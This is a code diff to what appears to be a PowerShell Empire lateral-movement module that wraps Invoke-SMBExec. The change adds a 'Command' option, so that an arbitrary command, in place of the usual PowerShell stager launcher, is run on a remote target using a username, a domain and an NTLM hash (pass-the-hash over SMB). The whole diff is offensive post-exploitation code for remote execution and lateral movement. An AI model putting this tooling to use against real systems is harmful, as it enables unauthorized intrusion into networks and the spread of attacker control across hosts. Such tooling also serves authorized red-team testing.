@@ -84,7 +84,13 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'Command' : {
+                'Description'   :   'Optional command instead of launcher.',
+                'Required'      :   False,
+                'Value'         :   'default'
             }
+
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -109,6 +115,8 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        command = self.options['Command']['Value']
+
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
         if obfuscate:
@@ -141,10 +149,11 @@ class Module:
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
-            else:
-
+            elif command == "":
                 stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
                 scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, stagerCmd)
+            else:
+                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, command)
 
 
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
